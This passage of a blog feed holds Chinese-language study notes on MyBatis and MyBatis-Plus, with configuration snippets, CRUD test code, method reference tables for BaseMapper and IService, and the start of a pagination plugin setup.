class="name">mappers</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- Mapper注册：指定Mybatis映射文件的具体位置 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- mapper标签：配置一个具体的Mapper映射文件 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- resource属性：指定Mapper映射文件的实际存储位置，这里需要使用一个以类路径</span></span><br><span class="line"><span class="comment">        根目录为基准的相对路径 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 对Maven工程的目录结构来说，resources目录下的内容会直接放入类路径，所</span></span><br><span class="line"><span class="comment">        以这里我们可以以resources目录为基准 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;Mapper/EmpMap.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="步骤4：编写测试"><a href="#步骤4：编写测试" class="headerlink" title="步骤4：编写测试"></a>步骤4：编写测试</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestMybatis</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testSelectEmployee</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 1.创建SqlSessionFactory对象</span></span><br><span class="line">        <span class="comment">// ①声明Mybatis全局配置文件的路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">mybatisConfigFilePath</span> <span class="operator">=</span> <span class="string">&quot;mybatis-config.xml&quot;</span>;</span><br><span class="line">        <span class="comment">// ②以输入流的形式加载Mybatis配置文件</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Resources.getResourceAsStream(mybatisConfigFilePath);</span><br><span class="line">        <span class="comment">// ③基于读取Mybatis配置文件的输入流创建SqlSessionFactory对象</span></span><br><span class="line">        <span class="type">SqlSessionFactory</span> <span class="variable">sessionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>().build(inputStream);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.使用SqlSessionFactory对象开启一个会话</span></span><br><span class="line">        <span class="comment">// 每次业务创建一个，用完即释放</span></span><br><span class="line">        <span class="comment">// openSession()自动开启事务，但不会自动提交，需要session.commit();</span></span><br><span class="line">        <span class="comment">// openSession(true)自动开启事务，自动提交</span></span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">session</span> <span class="operator">=</span> sessionFactory.openSession();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.根据EmployeeMapper接口的Class对象获取Mapper接口类型的对象(动态代理技术)</span></span><br><span class="line">        <span class="comment">// 调用代理对象的方法，就会查找mapper接口方法。</span></span><br><span class="line">        <span class="type">EmployeeMapper</span> <span class="variable">employeeMapper</span> <span class="operator">=</span> session.getMapper(EmployeeMapper.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 调用代理类方法即可以触发对应的SQL语句</span></span><br><span class="line">        <span class="type">Employee</span> <span class="variable">employee</span> <span class="operator">=</span> employeeMapper.queryById(<span class="number">1</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;employee = &quot;</span> + employee);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5.关闭SqlSession</span></span><br><span class="line">        session.commit(); <span class="comment">//提交事务 [DQL不需要,其他需要]</span></span><br><span class="line">        session.close(); <span class="comment">//关闭会话</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用Ibatis方式时，进行SQL操作的方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestMybatis</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testSelectEmployee</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 1.创建SqlSessionFactory对象</span></span><br><span class="line">        <span class="comment">// ①声明Mybatis全局配置文件的路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">mybatisConfigFilePath</span> <span class="operator">=</span> <span class="string">&quot;mybatis-config.xml&quot;</span>;</span><br><span class="line">        <span class="comment">// ②以输入流的形式加载Mybatis配置文件</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Resources.getResourceAsStream(mybatisConfigFilePath);</span><br><span class="line">        <span class="comment">// ③基于读取Mybatis配置文件的输入流创建SqlSessionFactory对象</span></span><br><span class="line">        <span class="type">SqlSessionFactory</span> <span class="variable">sessionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>().build(inputStream);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.使用SqlSessionFactory对象开启一个会话</span></span><br><span class="line">        <span class="comment">// 每次业务创建一个，用完即释放</span></span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">session</span> <span class="operator">=</span> sessionFactory.openSession();</span><br><span class="line">		</span><br><span class="line">        <span class="comment">/* 与MyBatis不同之处：</span></span><br><span class="line"><span class="comment">        	这里可以直接使用SqlSession提供的crud方法进行数据库操作。</span></span><br><span class="line"><span class="comment">        	其实就是让Ibatis查找到对应标签，执行里面的SQL语句。</span></span><br><span class="line"><span class="comment">        	缺陷：1. 参数1 很容易写错</span></span><br><span class="line"><span class="comment">        		 2. sql语句参数只能传递一个，如果多个参数需要整合。</span></span><br><span class="line"><span class="comment">        		 3. 返回值需要自己指定，不会提示。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">// 可用方法：selectOne,selectList,insert,delete,update</span></span><br><span class="line">        <span class="comment">// 参数1：字符串，sql标签对应的标识，即标签id属性值，或使用全名，即namespace.id</span></span><br><span class="line">        <span class="comment">// 参数2：Object，执行SQL语句的传入参数。</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> sqlSession.selectOne(<span class="string">&quot;xx.jj.kkk&quot;</span>,<span class="number">1</span>)；</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 5.关闭SqlSession</span></span><br><span class="line">        session.commit(); <span class="comment">//提交事务 [DQL不需要,其他需要]</span></span><br><span class="line">        session.close(); <span class="comment">//关闭会话</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>Java</category>
        <category>框架与工具</category>
      </categories>
      <tags>
        <tag>MyBatis</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-SSM-Mybatis-Plus</title>
    <url>/2025/02/02/Java-SSM-Mybatis-Plus/</url>
    <content><![CDATA[<h2 id="笔记说明"><a href="#笔记说明" class="headerlink" title="笔记说明"></a>笔记说明</h2><h3 id="笔记平台"><a href="#笔记平台" class="headerlink" title="笔记平台"></a>笔记平台</h3><p>（1）IDEA开发工具：2022.1.2<br>（2）JDK：Java17<strong>（Spring6要求JDK最低版本是Java17）</strong><br>（3）Spring：6.0.2</p>
<p>（4）Maven：3.6+</p>
<p>（5） MybatisPlus：3.5.31</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><strong>主要参考资料：</strong></p>
<p><a href="https://www.bilibili.com/video/BV1AP411s7D7/?spm_id_from=333.1387.search.video_card.click&vd_source=20530c92c1be8bd70e37346e3a5c037a">尚硅谷-SSM</a></p>
<p><a href="https://baomidou.com/">MybatisPlus官方</a></p>
<p><strong>其他参考资料：</strong></p>
<p><a href="https://www.bilibili.com/video/BV12R4y157Be/?spm_id_from=333.1387.search.video_card.click">【尚硅谷】<em>MyBatis</em>Plus教程（一套玩转<em>mybatis</em>-plus）</a></p>
<p><a href="https://www.bilibili.com/video/BV1Ds411E76Y/?spm_id_from=333.1387.search.video_card.click">尚硅谷<em>MyBatis</em>Plus教程(<em>mybatis</em>-plus框架精讲)</a></p>
<h1 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>MyBatis-Plus（简称MP）是一个MyBatis的增强工具，旨在简化开发、提高效率。它在<strong>不改变MyBatis原有功能</strong>的基础上，提供了更多的便捷特性，使得数据库操作更加简便和高效。以下是关于MyBatis-Plus的一些关键点介绍：</p>
<p><strong>核心特性：</strong></p>
<ol>
<li><strong>无侵入性</strong>：完全兼容原生MyBatis，无需对现有项目进行大规模修改即可集成使用。</li>
<li><strong>通用CRUD接口</strong>：提供了一套通用的Mapper接口和Service接口，支持基本的增删改查操作，极大地减少了重复代码的编写。</li>
<li><strong>条件构造器</strong>：内置了强大的条件构造器Wrapper，支持链式调用，可以灵活构建查询条件，满足复杂的查询需求。</li>
<li><strong>分页插件</strong>：内置了高效的分页插件，只需简单配置即可实现分页功能，减少手动编写SQL语句的工作量。</li>
<li><strong>性能分析插件</strong>：帮助开发者分析SQL执行效率，找出潜在的性能瓶颈。</li>
<li><strong>代码生成器</strong>：可以根据数据库表自动生成实体类、Mapper接口、Service接口及其实现类等，大大提升了开发速度。</li>
</ol>
<p>MyBatis-Plus适用于各种规模的企业级应用开发，特别是在需要快速迭代和频繁变更业务逻辑的情况下尤为适用。它能够显著降低开发成本，提高开发效率，特别适合那些对数据库操作有较高要求的应用程序。</p>
<p><strong>总结：</strong></p>
<ul>
<li>自动生成单表的CRUD功能</li>
<li>提供丰富的条件拼接方式</li>
<li>全自动ORM类型持久层框架</li>
</ul>
<h2 id="快速启动"><a href="#快速启动" class="headerlink" title="快速启动"></a>快速启动</h2><h3 id="导入依赖"><a href="#导入依赖" class="headerlink" title="导入依赖"></a>导入依赖</h3><p>直接导入<code>Mybatis-Plus</code>的依赖，无需再导入<code>Mybatis</code>的依赖，内部已经包含。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- boot2需要的 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- boot3需要的 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-spring-boot3-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>无需</strong>再导入</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>Mybatis-Plus的配置基本以<code>mybatis-plus</code>开头，如</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">configuration:</span></span><br><span class="line">    <span class="attr">log-impl:</span> <span class="string">org.apache.ibatis.logging.stdout.StdOutImpl</span> <span class="comment"># 控制台输出SQL语句</span></span><br><span class="line">    <span class="comment"># 驼峰式命名映射无需配置，内部默认开启</span></span><br><span class="line">    <span class="attr">auto-mapping-behavior:</span> <span class="string">full</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">classpath*:/mapper/*.xml</span></span><br><span class="line">  <span class="attr">type-aliases-package:</span> <span class="string">com.fu.pojo</span></span><br></pre></td></tr></table></figure>





<h3 id="继承接口BaseMapper"><a href="#继承接口BaseMapper" class="headerlink" title="继承接口BaseMapper"></a>继承接口BaseMapper</h3><p>原来的Mapper接口无需再定义各种函数，直接继承<code>BaseMapper&lt;&gt;</code>接口即可实现需要的查询：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> <span class="keyword">extends</span> <span class="title class_">BaseMapper</span>&lt;User&gt; &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h1 id="核心功能"><a href="#核心功能" class="headerlink" title="核心功能"></a>核心功能</h1><h2 id="基于Mapper接口CRUD"><a href="#基于Mapper接口CRUD" class="headerlink" title="基于Mapper接口CRUD"></a>基于Mapper接口CRUD</h2><p>通用CRUD封装<code>BaseMapper</code>接口，Mybatis-Plus启动时自动解析实体表关系映射转换为Mybatis内部对象注入容器！内部包含常见的单表操作。</p>
<p>原流程：mapper接口定义crud方法 &#x3D;》 mapper.xml编写crud对应SQL语句</p>
<p>现流程：mapper接口继承<code>BaseMapper</code>接口。如还想自定义CRUD方法按原方式定义。</p>
<h3 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h3><p>Mapper层的mapper接口继承<code> BaseMappe</code>接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> <span class="keyword">extends</span> <span class="title class_">BaseMapper</span>&lt;User&gt; &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><table>
<thead>
<tr>
<th>操作类型</th>
<th>方法签名</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>插入</td>
<td><code>int insert(T entity)</code></td>
<td>向数据库中插入一条记录 16。</td>
</tr>
<tr>
<td>删除</td>
<td><code>int deleteById(Serializable id)</code></td>
<td>根据主键 ID 删除一条记录 16。</td>
</tr>
<tr>
<td>删除</td>
<td><code>int deleteByMap(@Param(&quot;cm&quot;) Map&lt;String, Object&gt; columnMap)</code></td>
<td>根据表字段 map 对象删除符合条件的记录 20。</td>
</tr>
<tr>
<td>删除</td>
<td><code>int delete(@Param(&quot;ew&quot;) Wrapper&lt;T&gt; wrapper)</code></td>
<td>根据条件构造器删除符合条件的记录 20。</td>
</tr>
<tr>
<td>删除</td>
<td><code>int deleteBatchIds(Collection&lt;? extends Serializable&gt; idList)</code></td>
<td>根据主键 ID 列表批量删除记录 20。</td>
</tr>
<tr>
<td>更新</td>
<td><code>int updateById(T entity)</code></td>
<td>根据主键 ID 更新记录 。</td>
</tr>
<tr>
<td>更新</td>
<td><code>int update(T entity, Wrapper&lt;T&gt; updateWrapper)</code></td>
<td>根据条件构造器更新符合条件的记录 。</td>
</tr>
<tr>
<td>查询</td>
<td><code>T selectById(Serializable id)</code></td>
<td>根据主键 ID 查询一条记录 。</td>
</tr>
<tr>
<td>查询</td>
<td><code>List&lt;T&gt; selectBatchIds(Collection&lt;? extends Serializable&gt; idList)</code></td>
<td>根据主键 ID 列表批量查询记录 。</td>
</tr>
<tr>
<td>查询</td>
<td><code>List&lt;T&gt; selectByMap(Map&lt;String, Object&gt; columnMap)</code></td>
<td>根据表字段 map 对象查询符合条件的记录 。</td>
</tr>
<tr>
<td>查询</td>
<td><code>T selectOne(Wrapper&lt;T&gt; queryWrapper)</code></td>
<td>根据条件构造器查询单条记录 。</td>
</tr>
<tr>
<td>查询</td>
<td><code>Integer selectCount(Wrapper&lt;T&gt; queryWrapper)</code></td>
<td>根据条件构造器统计符合条件的记录总数 。</td>
</tr>
<tr>
<td>查询</td>
<td><code>List&lt;T&gt; selectList(Wrapper&lt;T&gt; queryWrapper)</code></td>
<td>根据条件构造器查询所有符合条件的记录 。</td>
</tr>
<tr>
<td>查询</td>
<td><code>List&lt;Map&lt;String, Object&gt;&gt; selectMaps(Wrapper&lt;T&gt; queryWrapper)</code></td>
<td>根据条件构造器查询并以 Map 形式返回结果 。</td>
</tr>
<tr>
<td>查询</td>
<td><code>List&lt;Object&gt; selectObjs(Wrapper&lt;T&gt; queryWrapper)</code></td>
<td>根据条件构造器查询并仅返回对象列表 。</td>
</tr>
<tr>
<td>分页查询</td>
<td><code>IPage&lt;T&gt; selectPage(IPage&lt;T&gt; page, Wrapper&lt;T&gt; queryWrapper)</code></td>
<td>根据条件构造器和分页参数进行分页查询 。</td>
</tr>
<tr>
<td>分页查询</td>
<td><code>IPage&lt;Map&lt;String, Object&gt;&gt; selectMapsPage(IPage&lt;T&gt; page, Wrapper&lt;T&gt; queryWrapper)</code></td>
<td>根据条件构造器和分页参数进行分页查询，并以 Map 形式返回结果</td>
</tr>
</tbody></table>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MybatisPlus</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testInsert</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">7</span>,<span class="string">&quot;liaoming&quot;</span>,<span class="number">2000.1</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">row</span> <span class="operator">=</span> userMapper.insert(user);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testDelete</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 根据主键删除</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">row</span> <span class="operator">=</span> userMapper.deleteById(<span class="number">7</span>);</span><br><span class="line">        <span class="comment">// 根据name=ling删除</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">param</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String,String&gt;();</span><br><span class="line">        param.put(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;ling&quot;</span>);</span><br><span class="line">        userMapper.deleteByMap(param);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testUpdate</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">1</span>,<span class="string">&quot;jiangxi&quot;</span>,<span class="number">1088.2</span>);</span><br><span class="line">        <span class="comment">// 相当于 update user set name = &#x27;jiangxi&#x27;,salary = 1088.2 where id = 1</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> userMapper.updateById(user);</span><br><span class="line">        <span class="comment">// 将所有人salary改为999.9</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user1.setSalary(<span class="number">999.9</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> userMapper.update(user1,<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="基于Service接口CRUD"><a href="#基于Service接口CRUD" class="headerlink" title="基于Service接口CRUD"></a>基于Service接口CRUD</h2><p>在某些业务场景中，Service层仅起到调用Mapper层接口方法的作用，此时可以直接在Service层就实现CRUD方法。用 Service CRUD <strong>封装IService (opens new window)接口</strong>，进一步封装 CRUD 采用以下前缀命名方式区分 Mapper 层避免混淆</p>
<ul>
<li>get 查询单行</li>
<li>remove 删除</li>
<li>list 查询集合</li>
<li>page 分页</li>
</ul>
<h3 id="实现方式-1"><a href="#实现方式-1" class="headerlink" title="实现方式"></a>实现方式</h3><p>在 MyBatis-Plus 中，<code>ServiceImpl</code> 是一个通用的服务实现类，它实现了 <code>IService</code> 接口。通过继承 <code>ServiceImpl</code> 并实现自定义的服务接口，可以快速搭建业务逻辑层，而无需重复编写基本的 CRUD 操作代码。</p>
<p><strong>Service层接口继承<code>IService</code>接口：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserService</span> <span class="keyword">extends</span> <span class="title class_">IService</span>&lt;User&gt; &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>接口实现类继承ServiceImpl实现类：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">ServiceImpl</span>&lt;UserMapper, User&gt; <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="常用方法-1"><a href="#常用方法-1" class="headerlink" title="常用方法"></a>常用方法</h3><h4 id="IService-常用方法"><a href="#IService-常用方法" class="headerlink" title="IService 常用方法"></a>IService 常用方法</h4><table>
<thead>
<tr>
<th>操作类型</th>
<th>方法签名</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>插入</strong></td>
<td><code>boolean save(T entity)</code></td>
<td>插入一条记录（选择字段，值为 null 则不会被插入）。</td>
</tr>
<tr>
<td><strong>批量插入</strong></td>
<td><code>boolean saveBatch(Collection&lt;T&gt; entityList)</code></td>
<td>批量插入多条记录（选择字段，值为 null 则不会被插入）。</td>
</tr>
<tr>
<td><strong>删除</strong></td>
<td><code>boolean removeById(Serializable id)</code></td>
<td>根据主键 ID 删除一条记录。</td>
</tr>
<tr>
<td><strong>批量删除</strong></td>
<td><code>boolean removeByIds(Collection&lt;? extends Serializable&gt; idList)</code></td>
<td>根据主键 ID 列表批量删除记录。</td>
</tr>
<tr>
<td><strong>插入或更新</strong></td>
<td><code>boolean saveOrUPdate((T entity)</code></td>
<td>根据主键 ID 是否为空决定插入或修改，为空插入，不为空修改</td>
</tr>
<tr>
<td><strong>更新</strong></td>
<td><code>boolean updateById(T entity)</code></td>
<td>根据主键 ID 更新一条记录（选择字段，值为 null 则不会被更新）。</td>
</tr>
<tr>
<td><strong>条件更新</strong></td>
<td><code>boolean update(T entity, Wrapper&lt;T&gt; updateWrapper)</code></td>
<td>根据条件构造器更新符合条件的记录。</td>
</tr>
<tr>
<td><strong>查询</strong></td>
<td><code>T getById(Serializable id)</code></td>
<td>根据主键 ID 查询一条记录。</td>
</tr>
<tr>
<td><strong>批量查询</strong></td>
<td><code>List&lt;T&gt; listByIds(Collection&lt;? extends Serializable&gt; idList)</code></td>
<td>根据主键 ID 列表批量查询记录。</td>
</tr>
<tr>
<td><strong>条件查询</strong></td>
<td><code>List&lt;T&gt; list(Wrapper&lt;T&gt; queryWrapper)</code></td>
<td>根据条件构造器查询所有符合条件的记录。</td>
</tr>
<tr>
<td><strong>分页查询</strong></td>
<td><code>IPage&lt;T&gt; page(IPage&lt;T&gt; page, Wrapper&lt;T&gt; queryWrapper)</code></td>
<td>根据条件构造器和分页参数进行分页查询。</td>
</tr>
<tr>
<td><strong>统计</strong></td>
<td><code>int count(Wrapper&lt;T&gt; queryWrapper)</code></td>
<td>根据条件构造器统计符合条件的记录总数。</td>
</tr>
</tbody></table>
<h4 id="ServiceImpl-提供的方法"><a href="#ServiceImpl-提供的方法" class="headerlink" title="ServiceImpl 提供的方法"></a>ServiceImpl 提供的方法</h4><table>
<thead>
<tr>
<th>操作类型</th>
<th>方法签名</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Mapper 引用</strong></td>
<td><code>protected BaseMapper&lt;T&gt; baseMapper</code></td>
<td>通过 <code>baseMapper</code> 可以访问 <code>BaseMapper</code> 提供的所有方法。</td>
</tr>
<tr>
<td><strong>插入</strong></td>
<td><code>boolean save(T entity)</code></td>
<td>调用 <code>baseMapper.insert(entity)</code> 实现插入操作。</td>
</tr>
<tr>
<td><strong>批量插入</strong></td>
<td><code>boolean saveBatch(Collection&lt;T&gt; entityList)</code></td>
<td>调用 <code>baseMapper.insertBatchSomeColumn(entityList)</code> 实现批量插入操作。</td>
</tr>
<tr>
<td><strong>删除</strong></td>
<td><code>boolean removeById(Serializable id)</code></td>
<td>调用 <code>baseMapper.deleteById(id)</code> 实现根据主键删除操作。</td>
</tr>
<tr>
<td><strong>批量删除</strong></td>
<td><code>boolean removeByIds(Collection&lt;? extends Serializable&gt; idList)</code></td>
<td>调用 <code>baseMapper.deleteBatchIds(idList)</code> 实现根据主键列表批量删除操作。</td>
</tr>
<tr>
<td><strong>更新</strong></td>
<td><code>boolean updateById(T entity)</code></td>
<td>调用 <code>baseMapper.updateById(entity)</code> 实现根据主键更新操作。</td>
</tr>
<tr>
<td><strong>条件更新</strong></td>
<td><code>boolean update(T entity, Wrapper&lt;T&gt; updateWrapper)</code></td>
<td>调用 <code>baseMapper.update(entity, updateWrapper)</code> 实现根据条件更新操作。</td>
</tr>
<tr>
<td><strong>查询</strong></td>
<td><code>T getById(Serializable id)</code></td>
<td>调用 <code>baseMapper.selectById(id)</code> 实现根据主键查询操作。</td>
</tr>
<tr>
<td><strong>批量查询</strong></td>
<td><code>List&lt;T&gt; listByIds(Collection&lt;? extends Serializable&gt; idList)</code></td>
<td>调用 <code>baseMapper.selectBatchIds(idList)</code> 实现根据主键列表批量查询操作。</td>
</tr>
<tr>
<td><strong>条件查询</strong></td>
<td><code>List&lt;T&gt; list(Wrapper&lt;T&gt; queryWrapper)</code></td>
<td>调用 <code>baseMapper.selectList(queryWrapper)</code> 实现根据条件查询操作。</td>
</tr>
<tr>
<td><strong>分页查询</strong></td>
<td><code>IPage&lt;T&gt; page(IPage&lt;T&gt; page, Wrapper&lt;T&gt; queryWrapper)</code></td>
<td>调用 <code>baseMapper.selectPage(page, queryWrapper)</code> 实现根据条件和分页参数进行分页查询操作。</td>
</tr>
<tr>
<td><strong>统计</strong></td>
<td><code>int count(Wrapper&lt;T&gt; queryWrapper)</code></td>
<td>调用 <code>baseMapper.selectCount(queryWrapper)</code> 实现根据条件统计记录数操作。</td>
</tr>
</tbody></table>
<h2 id="分页查询实现"><a href="#分页查询实现" class="headerlink" title="分页查询实现"></a>分页查询实现</h2><p>原分页查询方法回顾：引入分页插件 &#x3D;》 设置分页参数 &#x3D;》编写SQL语句（不以<code>;</code>结尾） &#x3D;》结果封装 &#x3D;》 获取数据</p>
<p>其原理相当于配置了一个后置拦截器，会在SQL语句后添加<code>limit</code>关键字及参数</p>
<h3 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h3><p><strong>主程序类导入分页插件</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@MapperScan(&quot;com.fu.mapper&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyApplication</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(MapperScan.class,args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mybatis-plus 插件加入到IoC容器</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> MybatisPlusInterceptor <span class="title function_">mybatisPlusInterceptor</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">// mybatis-plus的插件集合</span></span><br><span class="line">        <span class="comment">// 【加入到此集合即可，mybatis-plus的如何插件，包括分页插件、乐观锁插件等都需要时应该加入】</span></span><br><span class="line">        <span class="type">MybatisPlusInterceptor</span> <span class="variable">mybatisPlusInterceptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MybatisPlusInterceptor</span>();</span><br><span class="line">        mybatisPlusInterceptor.addInnerInterceptor(<span 